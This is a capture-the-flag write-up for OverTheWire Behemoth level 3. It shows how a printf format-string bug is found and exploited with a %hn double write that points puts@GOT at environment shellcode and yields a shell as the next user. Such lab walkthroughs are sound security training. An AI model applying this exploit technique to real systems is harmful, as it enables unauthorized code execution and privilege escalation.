# OverTheWire — Behemoth Level 3 → 4

> Goal: Get behemoth4 password from `behemoth3`. Result: **`**********`** (hidden)
> Technique: **format string** vulnerability → redirect `puts@GOT` to env shellcode via `%hn`.

---

## 1. Connection
```bash
ssh behemoth3@behemoth.labs.overthewire.org -p 2221
```

## 2. Vulnerability — disasm/ltrace
```c
printf("Identify yourself: ");
fgets(buf, 200, stdin);
printf("Welcome, ");
printf(buf);                 // BUG: format string = user input
puts("\naaaand goodbye again.");
```
`printf(buf)` → format string. No `system`/shell → we'll hijack flow via GOT overwrite.
`readelf`: `GNU_STACK RWE`.

## 3. Offset + target
```bash
echo "AAAA%x.%x.%x" | ltrace /behemoth/behemoth3
# printf("AAAA%x...", 0x41414141, ...)   -> first %x = AAAA  =>  offset = 1
objdump -R /behemoth/behemoth3 | grep puts
# 0804b218 R_386_JUMP_SLOT  puts          -> puts@GOT = 0x0804b218
```
`puts(...)` is called after `printf(buf)` → if we overwrite **puts@GOT** to shellcode address,
that `puts` call will jump to shellcode.

## 4. Exploit — writing to GOT with `%hn` (offset 1)
Put NOP sled + shellcode in EGG; find address via getenvaddr. Split shellcode address into two
16-bit halves and write to `puts@GOT` (low half) and `puts@GOT+2` (high half) via `%hn`
(smaller value first):
```python
egg = EGG_addr + 20000                     # sled midpoint
lh = egg & 0xffff; hh = (egg>>16) & 0xffff  # hh typically 0xffff
got = 0x0804b218
payload  = pack(got) + pack(got+2)          # addresses at offsets 1 and 2
payload += b'%.{lh-8}x%1$hn'                # puts@GOT = lh  (8 address bytes + (lh-8) = lh)
payload += b'%.{hh-lh}x%2$hn'               # puts@GOT+2 = hh
# fgets reads from stdin -> payload+"\n", wait (printf prints ~64KB), puts->shellcode, timed command
```
`puts@GOT` now points to shellcode → `puts("aaaand goodbye...")` → shellcode → `/bin/sh`.
Output: `uid=13004(behemoth4)` → password.


## Lessons
| Topic | Note |
|-------|------|
| format string | `printf(buf)` → arbitrary write via `%n`/`%hn` |
| GOT overwrite | Redirect the GOT entry of the next called function (`puts`) to shellcode |
| offset 1 | Verified via ltrace (first `%x` = our input) |
| `%hn` double write | 32-bit address → two 16-bit halves; write smaller value first (counter only increases) |
